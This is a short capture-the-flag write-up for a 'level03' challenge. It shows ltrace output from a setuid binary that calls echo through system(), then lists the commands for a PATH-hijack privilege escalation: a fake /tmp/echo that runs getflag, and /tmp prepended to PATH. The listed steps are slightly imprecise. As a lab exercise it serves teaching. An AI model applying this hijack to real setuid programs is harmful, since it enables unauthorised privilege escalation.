- When we entered to the level03 user, we found a executable file (level03).

- After exec this executable we got => “exploit me”.

- after get some infos with “ltrace level03” cmd:

  "\_\_libc_start_main(0x80484a4, 1, 0xbffff7a4, 0x8048510, 0x8048580 <unfinished ...>
  getegid() = 2003
  geteuid() = 2003
  setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
  setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
  system("/usr/bin/env echo Exploit me"Check flag.Here is your token :
  Nope there is no token here for you sorry. Try again :)
  <unfinished ...>
  --- SIGCHLD (Child exited) ---
  <... system resumed> ) = 0
  +++ exited (status 0) +++"

- We found that the program is running the echo command with system func

- So we created a executable file in /tmp with echo name and this file execute a “getflag” cmd,
  and added the /tmp folder to path environment variable.

1 --> echo "getflag"
2 --> /tmp/echo
3 --> chmod 777 /tmp/echo
4 --> export PATH=/tmp:$PATH

- We launch the level03 executable again, and we got the flag
